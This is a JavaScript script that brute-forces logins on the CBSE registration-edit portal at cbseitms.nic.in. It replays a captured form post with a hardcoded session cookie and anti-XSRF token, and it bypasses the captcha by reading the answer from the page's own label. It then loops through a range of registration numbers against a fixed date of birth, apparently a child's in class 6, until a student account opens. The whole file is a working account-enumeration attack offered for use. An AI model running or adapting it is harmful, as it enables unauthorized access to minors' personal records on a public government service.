/*
https://cbseitms.nic.in/RegistrationEditLogin.aspx
*/

function makeReq(regNo, dob, captcha, max) {
	const [d, o, b] = dob.split('/');
	fetch("https://cbseitms.nic.in/RegistrationEditLogin.aspx", {
		"headers": {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language": "en-IN,en;q=0.9,hi;q=0.8",
			"cache-control": "max-age=0",
			"content-type": "application/x-www-form-urlencoded",
			"sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"",
			"sec-ch-ua-mobile": "?0",
			"sec-fetch-dest": "document",
			"sec-fetch-mode": "navigate",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"sec-gpc": "1",
			"upgrade-insecure-requests": "1",
			"cookie": "ASP.NET_SessionId=ymbu0zmtomwa04qxteu0ued1; __AntiXsrfToken=ba3cc6d28d7a4f5484d2c972a867fe01"
		},
		"referrer": "https://cbseitms.nic.in/RegistrationEditLogin.aspx",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": `ToolkitScriptManager1_HiddenField=%3B%3BAjaxControlToolkit%2C+Version%3D3.5.51116.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D28f01b0e84b6d53e%3Aen%3A2a06c7e2-728e-4b15-83d6-9b269fb7261e%3Ade1feab2%3Afcf0e993%3Af2c8e708%3A720a52bf%3Af9cec9bc%3A589eaa30%3A698129cf%3Afb9b4c57%3Accb96cf9&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=VnBFdrOS3WQI22tb%2BidFvr96ugip9a6Fwgw%2FQqCL5sEP%2FgqU3bV%2Bb%2FgLhAOVxaEJ1EmmwSbqAqr3sJv0aPPWrKpKoBqmobaEfBltErGSNGMhC78umpeBqoQcIl4t5MzZrwkxKTwK0iokA1qZTgwa9dJp5WR84p5jKifF7MXjc5fWWs1VygryePAOeKlqaBpmsY8TwRzlS1lq85TZVYUQ0Bqg3ScEgOHDiae9TzV0v424VdaGMMM%2BkFjDmN%2FGZKAViauh9dGz8TkLq7JZYIdwqhF7HZ%2BCKwJYOQ4dG2W%2FUB164tjKYNBAotQEBv%2BWFry%2FglUPP0cKJxwCHPDHI1q4XlJCJK%2BA5%2BiTdJ9Mby76VkAGxsttdvXKwb%2BW8Gom7PLOjZPhFuRWpRnkzGCNe6TiIsKkhC1ldWm%2Fp7v28vZFguQV%2F1Rsx0w%2FXBnM9G4NpEA%2B49gyOk4fp0wBkzzsxPwUaacn0rtcryEOtk%2FNP%2B6GFGwoBvLB&__VIEWSTATEGENERATOR=8001D938&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=G1pcJJYG6DaoRSsXdf9CgrGkWJhHQ7RvLLR67PUl4hBSY6myJsQaQUgLjOm41yQbaV3ORAYkP4VuFNmZuOWDLd3vcpRpsbBnJruvM9GdasoW40%2FKSbut03JOYD0%2FYdUGSAjFBfUfuoeWHriCNn2cXJgdlwnvvM8JXfxhQpPy8Un0mbkdo0EceYJP4NI7JP6apKy1XXn6s5QgFXGR66wF6uaBvlZOmNaSZHaTKU919%2BAvoQSQPjy3ZbV5PlXHf4EK5TRT2th9MvbUynOniVPc28Lux4DtcNFzrCfVpplChz4pqI2JEyui3nja1nTFdxURNLR8CpqcBQ5SJTByRM01gYjxFbk%3D&txtRegNo=${regNo}&txtDOB=${d}%2F${o}%2F${b}&inputCaptcha=${captcha}&btnSubmit=Sign+In&hidReg=YaDfpWY%3D&hidClass=6`,
		"method": "POST",
		"mode": "cors"
	})
		.then(response => response.body)
		.then(rb => {
			const reader = rb.getReader();

			return new ReadableStream({
				start(controller) {
					// The following function handles each data chunk
					function push() {
						// "done" is a Boolean and value a "Uint8Array"
						reader.read().then(({ done, value }) => {
							// If there is no more data to read
							if (done) {
								// console.log('done =', done);
								controller.close();
								return;
							}
							// Get the data and send it to the browser via the controller
							controller.enqueue(value);
							// Check chunks by logging to the console
							// console.log(done, value);
							push();
						})
					}
					push();
				}
			});
		})
		.then(stream => {
			// Respond with our stream
			return new Response(stream, { headers: { "Content-Type": "text/html" } }).text();
		})
		.then(result => {
			// Do things with result
			console.log('done with', regNo);
			if (result.includes('HINDI')) {
				alert('success');
				console.log(regNo, dob);
				return;
			} else {
				if (regNo === max) return;
				makeReq(++regNo, dob, cap.value, max)
			}
		});
}

const regInput = document.querySelector("#txtRegNo")
const dobInput = document.querySelector("#txtDOB")
const cap = document.querySelector("#lblinputCaptcha")
const capInput = document.querySelector("#inputCaptcha")
const submit = document.querySelector("#btnSubmit")

// for (; regId < 22150100360; regId += 1) {
	// regInput.value = regId
	// dobInput.value = "06/04/2010"
	// capInput.value = cap.value
	// submit.click()
	// console.log(regId, 'done')
// 	if (makeReq(regId, "11/10/2011", cap.value)) break;
// }

makeReq(22150100357, "11/10/2011", cap.value, 22150100400)
